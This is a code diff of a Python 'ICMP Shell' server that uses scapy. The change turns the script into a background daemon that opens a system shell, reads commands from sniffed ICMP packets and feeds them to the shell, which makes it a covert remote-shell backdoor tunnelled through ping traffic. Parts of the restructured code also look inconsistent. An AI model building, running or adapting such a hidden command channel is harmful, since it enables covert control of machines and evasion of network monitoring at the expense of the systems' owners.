@@ -1,18 +1,16 @@
 import argparse
+import subprocess
 import sys
 import threading
 
+from daemoniker import Daemonizer
 from scapy.layers.inet import IP, ICMP
 from scapy.layers.l2 import Ether
 from scapy.sendrecv import sniff, send, sendp
 
 import config
+import opening_terminal
 from opening_terminal import p
-
-output = None
-error = None
-destination_ip = ""
-destination_mac = "ff:ff:ff:ff:ff:ff"
 
 
 def readstdout():
@@ -52,29 +50,41 @@ def packet_callback(packet):
         print("-----+ OUT DATA +-----")
         sendcommand(received_data)
 
+with Daemonizer as (is_setup, daemonizer):
+    if is_setup:
+        ish_debug = 1
 
-def main():
-    ish_debug = 1
+        parser = argparse.ArgumentParser(description='ICMP Shell')
 
-    parser = argparse.ArgumentParser(description='ICMP Shell')
+        parser.add_argument('-i', help='Назначение идентификатора процесса (диапазон: 0-65535; по-умолчанию 1515)')
+        parser.add_argument('-d', help='Запуск сервера в режиме debug', action='store_true')
 
-    parser.add_argument('-i', help='Назначение идентификатора процесса (диапазон: 0-65535; по-умолчанию 1515)')
-    parser.add_argument('-d', help='Запуск сервера в режиме debug', action='store_true')
+        args = parser.parse_args()
 
-    args = parser.parse_args()
+        if args.i:
+            config.ID = args.i
+        if args.d:
+            ish_debug = 0
 
-    if args.i:
-        config.ID = args.i
-    if args.d:
-        ish_debug = 0
-    t1 = threading.Thread(target=readstdout)
-    t2 = threading.Thread(target=readstderr)
+    is_parent, destination_ip, destination_mac, t1, t2 = daemonizer(
+        'icmp-shell.pid',
+        "",
+        "ff:ff:ff:ff:ff:ff",
+        threading.Thread(target=readstdout),
+        threading.Thread(target=readstderr)
+    )
 
-    t1.start()
-    t2.start()
+p = subprocess.Popen(
+    opening_terminal.terminal_name,
+    stdout=subprocess.PIPE,
+    stdin=subprocess.PIPE,
+    stderr=subprocess.PIPE,
+    shell=True
+)
 
-    if (ish_debug):
-        sniff(filter="icmp", prn=packet_callback)
+t1.start()
+t2.start()
+sniff(filter="icmp", prn=packet_callback)
 
 
 # sniff(filter="icmp", prn=packet_callback)
@@ -149,9 +159,6 @@ def main():
 #        t2.start()
 #        sniff(filter="icmp", prn=packet_callback)
 
-
-if __name__ == '__main__':
-    main()
     # if len(sys.argv) == 1:
     #    servicemanager.Initialize()
     #    servicemanager.PrepareToHostSingle(Service)
